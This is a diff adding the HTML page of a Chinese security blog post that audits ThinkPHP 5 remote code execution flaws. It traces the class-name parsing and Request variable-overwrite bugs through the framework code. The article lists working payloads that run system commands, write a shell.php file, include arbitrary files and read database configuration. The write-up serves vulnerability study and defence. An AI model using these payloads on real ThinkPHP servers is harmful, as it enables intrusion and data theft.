@@ -1,0 +1,675 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='本篇博文会复现大多数tp5的漏洞，持续更新
+审计环境搭建 安装thinkphp 推荐使用composer，版本切换很方便
+composer create-project --prefer-dist topthink/think=5.0.10 tp5.0.10 将 composer.json 文件的 require 字段设置成如下：
+&amp;quot;require&amp;quot;: { &amp;quot;php&amp;quot;: &amp;quot;&amp;gt;=5.4.0&amp;quot;, &amp;quot;topthink/framework&amp;quot;: &amp;quot;5.0.10&amp;quot; }, 然后执行 composer update
+PhpStorm&#43;Xdebug调试环境 可以看我另外一篇文章：Debian下PHP Xdebug调试环境搭建
+框架基本流程 讲的很不错：https://paper.seebug.org/888/#_4
+RCE-类名解析导致任意类方法调用  ThinkPHP版本：5.0.7&amp;lt;=5.0.x&amp;lt;=5.0.22 、5.1.0&amp;lt;=5.1.x&amp;lt;=5.1.30
+未开启强制路由
+参考：
+https://github.com/Mochazz/ThinkPHP-Vuln/blob/master/ThinkPHP5/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C9.md
+https://paper.seebug.org/888/#poc
+https://xz.aliyun.com/t/3570
+ payload:
+5.1.x ：
+?s=index/\think\Request/input&amp;amp;filter[]=system&amp;amp;data=pwd ?s=index/\think\view\driver\Php/display&amp;amp;content=&amp;lt;?php phpinfo();?&amp;gt; ?s=index/\think\template\driver\file/write&amp;amp;cacheFile=shell.php&amp;amp;content=&amp;lt;?php phpinfo();?&amp;gt; ?s=index/\think\Container/invokefunction&amp;amp;function=call_user_func_array&amp;amp;vars[0]=system&amp;amp;vars[1][]=id ?s=index/\think\app/invokefunction&amp;amp;function=call_user_func_array&amp;amp;vars[0]=system&amp;amp;vars[1][]=id 5.0.x ：
+?s=index/think\config/get&amp;amp;name=database.username # 获取配置信息 ?s=index/\think\Lang/load&amp;amp;file=../../test.jpg # 包含任意文件 ?s=index/\think\Config/load&amp;amp;file=../../t.php # 包含任意.php文件 ?s=index/\think\app/invokefunction&amp;amp;function=call_user_func_array&amp;amp;vars[0]=system&amp;amp;vars[1][]=id 5.1.x类名解析 2018年12月9日官方发布的补丁，在library/think/route/dispatch/Module.php获取控制器名处加了个一个正则waf
+洞其实不在这里
+在路由调度的时候：
+跟进到thinkphp/library/think/route/dispatch/Module.php:
+跟进controller方法：(thinkphp/library/think/App.php)
+跟进parseModuleAndClass方法：(thinkphp/library/think/App.php)
+这个方法先对$name(类名)进行判断，当$name含有\时会直接将其作为类的命名空间路径，导致我们可以任意方法调用，比如：
+ thinkphp/library/think/Container.'><title>thinkphp5代码审计</title>
+
+<link rel='canonical' href='https://anthem-whisper.github.io/p/thinkphp5%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/'>
+
+<link rel="stylesheet" href="/scss/style.min.css"><meta property='og:title' content='thinkphp5代码审计'>
+<meta property='og:description' content='本篇博文会复现大多数tp5的漏洞，持续更新
+审计环境搭建 安装thinkphp 推荐使用composer，版本切换很方便
+composer create-project --prefer-dist topthink/think=5.0.10 tp5.0.10 将 composer.json 文件的 require 字段设置成如下：
+&amp;quot;require&amp;quot;: { &amp;quot;php&amp;quot;: &amp;quot;&amp;gt;=5.4.0&amp;quot;, &amp;quot;topthink/framework&amp;quot;: &amp;quot;5.0.10&amp;quot; }, 然后执行 composer update
+PhpStorm&#43;Xdebug调试环境 可以看我另外一篇文章：Debian下PHP Xdebug调试环境搭建
+框架基本流程 讲的很不错：https://paper.seebug.org/888/#_4
+RCE-类名解析导致任意类方法调用  ThinkPHP版本：5.0.7&amp;lt;=5.0.x&amp;lt;=5.0.22 、5.1.0&amp;lt;=5.1.x&amp;lt;=5.1.30
+未开启强制路由
+参考：
+https://github.com/Mochazz/ThinkPHP-Vuln/blob/master/ThinkPHP5/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C9.md
+https://paper.seebug.org/888/#poc
+https://xz.aliyun.com/t/3570
+ payload:
+5.1.x ：
+?s=index/\think\Request/input&amp;amp;filter[]=system&amp;amp;data=pwd ?s=index/\think\view\driver\Php/display&amp;amp;content=&amp;lt;?php phpinfo();?&amp;gt; ?s=index/\think\template\driver\file/write&amp;amp;cacheFile=shell.php&amp;amp;content=&amp;lt;?php phpinfo();?&amp;gt; ?s=index/\think\Container/invokefunction&amp;amp;function=call_user_func_array&amp;amp;vars[0]=system&amp;amp;vars[1][]=id ?s=index/\think\app/invokefunction&amp;amp;function=call_user_func_array&amp;amp;vars[0]=system&amp;amp;vars[1][]=id 5.0.x ：
+?s=index/think\config/get&amp;amp;name=database.username # 获取配置信息 ?s=index/\think\Lang/load&amp;amp;file=../../test.jpg # 包含任意文件 ?s=index/\think\Config/load&amp;amp;file=../../t.php # 包含任意.php文件 ?s=index/\think\app/invokefunction&amp;amp;function=call_user_func_array&amp;amp;vars[0]=system&amp;amp;vars[1][]=id 5.1.x类名解析 2018年12月9日官方发布的补丁，在library/think/route/dispatch/Module.php获取控制器名处加了个一个正则waf
+洞其实不在这里
+在路由调度的时候：
+跟进到thinkphp/library/think/route/dispatch/Module.php:
+跟进controller方法：(thinkphp/library/think/App.php)
+跟进parseModuleAndClass方法：(thinkphp/library/think/App.php)
+这个方法先对$name(类名)进行判断，当$name含有\时会直接将其作为类的命名空间路径，导致我们可以任意方法调用，比如：
+ thinkphp/library/think/Container.'>
+<meta property='og:url' content='https://anthem-whisper.github.io/p/thinkphp5%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/'>
+<meta property='og:site_name' content='wh1sper'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='代码审计' /><meta property='article:published_time' content='2021-03-12T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2021-03-12T00:00:00&#43;00:00'/><meta property='og:image' content='https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210312152311.jpeg' />
+<meta name="twitter:title" content="thinkphp5代码审计">
+<meta name="twitter:description" content="本篇博文会复现大多数tp5的漏洞，持续更新
+审计环境搭建 安装thinkphp 推荐使用composer，版本切换很方便
+composer create-project --prefer-dist topthink/think=5.0.10 tp5.0.10 将 composer.json 文件的 require 字段设置成如下：
+&amp;quot;require&amp;quot;: { &amp;quot;php&amp;quot;: &amp;quot;&amp;gt;=5.4.0&amp;quot;, &amp;quot;topthink/framework&amp;quot;: &amp;quot;5.0.10&amp;quot; }, 然后执行 composer update
+PhpStorm&#43;Xdebug调试环境 可以看我另外一篇文章：Debian下PHP Xdebug调试环境搭建
+框架基本流程 讲的很不错：https://paper.seebug.org/888/#_4
+RCE-类名解析导致任意类方法调用  ThinkPHP版本：5.0.7&amp;lt;=5.0.x&amp;lt;=5.0.22 、5.1.0&amp;lt;=5.1.x&amp;lt;=5.1.30
+未开启强制路由
+参考：
+https://github.com/Mochazz/ThinkPHP-Vuln/blob/master/ThinkPHP5/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C9.md
+https://paper.seebug.org/888/#poc
+https://xz.aliyun.com/t/3570
+ payload:
+5.1.x ：
+?s=index/\think\Request/input&amp;amp;filter[]=system&amp;amp;data=pwd ?s=index/\think\view\driver\Php/display&amp;amp;content=&amp;lt;?php phpinfo();?&amp;gt; ?s=index/\think\template\driver\file/write&amp;amp;cacheFile=shell.php&amp;amp;content=&amp;lt;?php phpinfo();?&amp;gt; ?s=index/\think\Container/invokefunction&amp;amp;function=call_user_func_array&amp;amp;vars[0]=system&amp;amp;vars[1][]=id ?s=index/\think\app/invokefunction&amp;amp;function=call_user_func_array&amp;amp;vars[0]=system&amp;amp;vars[1][]=id 5.0.x ：
+?s=index/think\config/get&amp;amp;name=database.username # 获取配置信息 ?s=index/\think\Lang/load&amp;amp;file=../../test.jpg # 包含任意文件 ?s=index/\think\Config/load&amp;amp;file=../../t.php # 包含任意.php文件 ?s=index/\think\app/invokefunction&amp;amp;function=call_user_func_array&amp;amp;vars[0]=system&amp;amp;vars[1][]=id 5.1.x类名解析 2018年12月9日官方发布的补丁，在library/think/route/dispatch/Module.php获取控制器名处加了个一个正则waf
+洞其实不在这里
+在路由调度的时候：
+跟进到thinkphp/library/think/route/dispatch/Module.php:
+跟进controller方法：(thinkphp/library/think/App.php)
+跟进parseModuleAndClass方法：(thinkphp/library/think/App.php)
+这个方法先对$name(类名)进行判断，当$name含有\时会直接将其作为类的命名空间路径，导致我们可以任意方法调用，比如：
+ thinkphp/library/think/Container."><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210312152311.jpeg' />
+    <link rel="shortcut icon" href="img/favicon.png" />
+
+    </head>
+    <body class="">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.body.dataset.scheme = 'dark';
+        } else {
+            document.body.dataset.scheme = 'light';
+        }
+    })();
+</script><div class="container main-container flex on-phone--column extended article-page with-toolbar">
+            <aside class="sidebar left-sidebar sticky">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header class="site-info">
+        
+            <figure class="site-avatar">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu493b2ad2ace11203a689e4edf1306ab0_73291_300x0_resize_box_2.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+
+                
+                    <span class="emoji">🍥</span>
+                
+            </figure>
+        
+        <h1 class="site-name"><a href="https://anthem-whisper.github.io/">wh1sper</a></h1>
+        <h2 class="site-description">专注Web安全与代码审计</h2>
+    </header>
+
+    <ol class="menu" id="main-menu">
+        
+        
+        
+
+        <li >
+            <a href='/'>
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>Home</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/about'>
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>About</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/archives'>
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>Archives</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/links'>
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>Links</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/search'>
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+
+        
+            <li id="dark-mode-toggle">
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                <span>暗色模式</span>
+            </li>
+        
+    </ol>
+</aside>
+
+            <main class="main full-width">
+    <div id="article-toolbar">
+        <a href="https://anthem-whisper.github.io/" class="back-home">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-chevron-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="15 6 9 12 15 18" />
+</svg>
+
+
+
+            <span>Back</span>
+        </a>
+    </div>
+
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/p/thinkphp5%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">
+                
+                    <img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210312152311.jpeg" loading="lazy" alt="Featured image of post thinkphp5代码审计" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" >
+                代码审计
+            </a>
+        
+    </header>
+    
+
+    <h2 class="article-title">
+        <a href="/p/thinkphp5%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">thinkphp5代码审计</a>
+    </h2>
+
+    <footer class="article-time">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+        <time class="article-time--published">Mar 12, 2021</time>
+    </footer></div>
+</header>
+
+    <section class="article-content">
+    <p>本篇博文会复现大多数tp5的漏洞，持续更新</p>
+<h2 id="审计环境搭建">审计环境搭建</h2>
+<h3 id="安装thinkphp">安装thinkphp</h3>
+<p>推荐使用composer，版本切换很方便</p>
+<pre><code>composer create-project --prefer-dist topthink/think=5.0.10 tp5.0.10
+</code></pre><p>将 composer.json 文件的 require 字段设置成如下：</p>
+<pre><code>&quot;require&quot;: {
+    &quot;php&quot;: &quot;&gt;=5.4.0&quot;,
+    &quot;topthink/framework&quot;: &quot;5.0.10&quot;
+},
+</code></pre><p>然后执行 <code>composer update</code></p>
+<h3 id="phpstormxdebug调试环境">PhpStorm+Xdebug调试环境</h3>
+<p>可以看我另外一篇文章：<a class="link" href="https://anthem-whisper.github.io/p/debian%e4%b8%8bphp-xdebug%e8%b0%83%e8%af%95%e7%8e%af%e5%a2%83%e6%90%ad%e5%bb%ba/"  target="_blank" rel="noopener"
+    >Debian下PHP Xdebug调试环境搭建</a></p>
+<h2 id="框架基本流程">框架基本流程</h2>
+<p>讲的很不错：https://paper.seebug.org/888/#_4</p>
+<h2 id="rce-类名解析导致任意类方法调用">RCE-类名解析导致任意类方法调用</h2>
+<blockquote>
+<p>ThinkPHP版本：5.0.7&lt;=5.0.x&lt;=5.0.22 、5.1.0&lt;=5.1.x&lt;=5.1.30</p>
+<p>未开启强制路由</p>
+<p>参考：</p>
+<p><a href="https://github.com/Mochazz/ThinkPHP-Vuln/blob/master/ThinkPHP5/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C9.md">https://github.com/Mochazz/ThinkPHP-Vuln/blob/master/ThinkPHP5/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C9.md</a></p>
+<p><a href="https://paper.seebug.org/888/#poc">https://paper.seebug.org/888/#poc</a></p>
+<p><a href="https://xz.aliyun.com/t/3570">https://xz.aliyun.com/t/3570</a></p>
+</blockquote>
+<p>payload:</p>
+<p><strong>5.1.x</strong> ：</p>
+<pre><code>?s=index/\think\Request/input&amp;filter[]=system&amp;data=pwd
+?s=index/\think\view\driver\Php/display&amp;content=&lt;?php phpinfo();?&gt;
+?s=index/\think\template\driver\file/write&amp;cacheFile=shell.php&amp;content=&lt;?php phpinfo();?&gt;
+?s=index/\think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id
+?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id
+</code></pre><p><strong>5.0.x</strong> ：</p>
+<pre><code>?s=index/think\config/get&amp;name=database.username # 获取配置信息
+?s=index/\think\Lang/load&amp;file=../../test.jpg    # 包含任意文件
+?s=index/\think\Config/load&amp;file=../../t.php     # 包含任意.php文件
+?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id
+</code></pre><h3 id="51x类名解析">5.1.x类名解析</h3>
+<p>2018年12月9日官方发布的补丁，在library/think/route/dispatch/Module.php获取控制器名处加了个一个正则waf</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210312150300.png" alt=""  /></p>
+<p>洞其实不在这里</p>
+<p>在路由调度的时候：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210312150307.png" alt="image-20210224183737791"  /></p>
+<p>跟进到thinkphp/library/think/route/dispatch/Module.php:</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210312150311.png" alt="image-20210224183857202"  /></p>
+<p>跟进controller方法：(thinkphp/library/think/App.php)</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210312150328.png" alt="image-20210224193234503"  /></p>
+<p>跟进parseModuleAndClass方法：(thinkphp/library/think/App.php)</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210312150405.png" alt="image-20210222221052520"  /></p>
+<p>这个方法先对<code>$name</code>(类名)进行判断，当<code>$name</code>含有<code>\</code>时会直接将其作为类的命名空间路径，导致我们可以任意方法调用，比如：</p>
+<ul>
+<li>thinkphp/library/think/Container.php：</li>
+</ul>
+<p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210312150430.png" alt="image-20210223112805010"  /></p>
+<pre><code>http://127.0.0.1/public/index.php?s=index/think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1
+</code></pre><p>通过自动加载的特性，<code>think\Container</code>可以直接调用thinkphp/library/think/Container.php的危险方法<code>invokefunction</code>，造成RCE。</p>
+<ul>
+<li>thinkphp/library/think/Request.php:</li>
+</ul>
+<p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210312150418.png" alt="image-20210223113330871"  /></p>
+<p>因为是private，所以查找同一类里面的用例：</p>
+<ol>
+<li>Request::input方法：</li>
+</ol>
+<p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210312150443.png" alt="image-20210223113649493"  /></p>
+<p>构造poc：</p>
+<pre><code>http://127.0.0.1/public/index.php?s=index/think\request/input&amp;data=1&amp;filter=phpinfo&amp;name=
+</code></pre><ol start="2">
+<li>Request::cookie方法：</li>
+</ol>
+<p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210312150457.png" alt="image-20210223114040419"  /></p>
+<p>构造poc：</p>
+<pre><code>http://127.0.0.1/public/?s=index/think\request/cookie&amp;name=cmd&amp;filter=phpinfo
+[HTTP header]
+Cookie: cmd=1
+</code></pre><p>同样成功RCE。</p>
+<ul>
+<li>thinkphp/library/think/template/driver/File.php:</li>
+</ul>
+<p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210312150511.png" alt="image-20210223130238959"  /></p>
+<p>构造poc：</p>
+<pre><code>http://127.0.0.1/public/?s=index/think\template\driver\file/write&amp;cacheFile=/tmp/test.txt&amp;content=hacked
+</code></pre><p>成功写入/tmp/test.txt文件。</p>
+<h3 id="50x类名解析">5.0.x类名解析</h3>
+<p>thinkphp/library/think/Loader.php:</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210312150528.png" alt="image-20210224104838156"  /></p>
+<p>原理类似，在<code>App::run()</code>方法里面，<code>Loader::controller</code>进行调度的时候，当<code>$name</code>含有<code>\</code>时会直接将其作为类的命名空间路径，导致我们可以任意方法调用。比如：</p>
+<ul>
+<li>thinkphp/library/think/App.php:</li>
+</ul>
+<p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210312150543.png" alt="image-20210224111256654"  /></p>
+<p>构造poc:</p>
+<pre><code>http://127.0.0.1/public/?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=assert&amp;vars[1][]=phpinfo()
+http://127.0.0.1/public/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1
+</code></pre><p>eval因为不是函数不能直接回调，在特定php版本情况下可以使用assert直接RCE，或者利用其他函数读写文件。</p>
+<h3 id="需要注意的问题">需要注意的问题</h3>
+<p>在https://xz.aliyun.com/t/3570#toc-3这篇文章里面提到：</p>
+<blockquote>
+<p>因为默认配置会判断是否自动转换控制器，将控制器名变成小写</p>
+<p>又因为<code>Loader.php::autoloadwin</code>在win环境下严格区分大小写，所以导致有些类加载不到</p>
+</blockquote>
+<p>但是我在Kali下经过小写转换同样也没办法加载到，可能是因为Linux本来就区分大小写？</p>
+<p>如此一来，着手点只有框架在加载的时候就已经加载的类了</p>
+<h2 id="rce-request核心类变量覆盖">RCE-Request核心类变量覆盖</h2>
+<blockquote>
+<p>ThinkPHP版本：5.0.0&lt;=ThinkPHP5&lt;=5.0.23 、5.1.0&lt;=ThinkPHP&lt;=5.1.30</p>
+<p>参考：</p>
+<p><a href="https://github.com/Mochazz/ThinkPHP-Vuln/blob/master/ThinkPHP5/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C10.md">https://github.com/Mochazz/ThinkPHP-Vuln/blob/master/ThinkPHP5/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C10.md</a></p>
+</blockquote>
+<p>payload：</p>
+<pre><code>http://php.local/thinkphp5.0.5/public/index.php?s=index
+post
+_method=__construct&amp;method=get&amp;filter[]=call_user_func&amp;get[]=phpinfo
+_method=__construct&amp;filter[]=system&amp;method=GET&amp;get[]=whoami
+
+# ThinkPHP &lt;= 5.0.13
+POST /?s=index/index
+s=whoami&amp;_method=__construct&amp;method=&amp;filter[]=system
+
+# ThinkPHP &lt;= 5.0.23、5.1.0 &lt;= 5.1.16 需要开启框架app_debug
+POST /
+_method=__construct&amp;filter[]=system&amp;server[REQUEST_METHOD]=ls -al
+
+# ThinkPHP &lt;= 5.0.23 需要存在xxx的method路由，例如captcha
+POST /?s=xxx HTTP/1.1
+_method=__construct&amp;filter[]=system&amp;method=get&amp;get[]=ls+-al
+_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=ls
+</code></pre><p>测试用的payload（版本5.0.10）：</p>
+<pre><code>http://127.0.0.1/public/index.php?s=index
+POST:
+_method=__construct&amp;filter[]=system&amp;method=get&amp;get[]=whoami
+</code></pre><p>在App::run()方法进行路由检测的时候，在Route.php大约843行调用<code>$request-&gt;method()</code>方法</p>
+<p>thinkphp/library/think/Request.php:</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210312150559.png" alt="image-20210308164140184"  /></p>
+<p>可以看到有一个可以控制的函数名<code>$_POST[Config::get['var_method']</code>，而<code>var_method</code>的值在application/config.php里面为<code>_method</code>:</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210312150613.png" alt="image-20210308164849228"  /></p>
+<p>于是可以POST传入<code>_method</code>改变<code>$this-&gt;{$this-&gt;method}($_POST);</code>达到任意调用此类中的方法</p>
+<p>而如果调用此类中的<code>__construct</code>方法：
+<img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210312150623.png" alt="image-20210308165349746"  /></p>
+<p>有一个foreach，可以引起POST数据对Requests对象属性的变量覆盖。</p>
+<p>在App::run()方法里面，如果我们开启了debug模式，则会调用Request::param()方法：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210312150633.png" alt="image-20210309112057671"  /></p>
+<p>当然，即使没有开启debug，在App::run()里面的调用的exec方法同样也会调用Request::param()方法</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210312150643.png" alt="image-20210309115557269"  /></p>
+<p>因为调用栈太深，就不一个个跟了</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210312150651.png" alt="image-20210309115705097"  /></p>
+<p>这个方法我们需要特别关注了，因为 <strong>Request</strong> 类中的 <code>param、route、get、post、put、delete、patch、request、session、server、env、cookie、input</code> 方法均调用了 <strong>filterValue</strong> 方法，而该方法中就存在可利用的 <strong>call_user_func</strong> 函数</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210312150703.png" alt="image-20210309113026498"  /></p>
+<p>不同的payload触发流程不一样，但是核心是一样的。</p>
+<p>任意方法调用发生在method()，变量覆盖发生在__construct()，rce发生在filterValue()</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210312150713.png" alt=""  /></p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a>
+        
+    </section>
+
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    </footer>
+
+    
+</article>
+
+    <aside class="related-contents--wrapper">
+    
+    
+        <h2 class="section-title">相关文章</h2>
+        <div class="related-contents">
+            <div class="flex article-list--tile">
+                
+                    
+<article class="">
+    <a href="/p/debian%E4%B8%8Bphp-xdebug%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Debian下PHP Xdebug调试环境搭建</h2>
+        </div>
+    </a>
+</article>
+                
+            </div>
+        </div>
+    
+</aside>
+
+
+    
+        
+    <div class="disqus-container">
+    <div id="disqus_thread"></div>
+<script type="application/javascript">
+    var disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
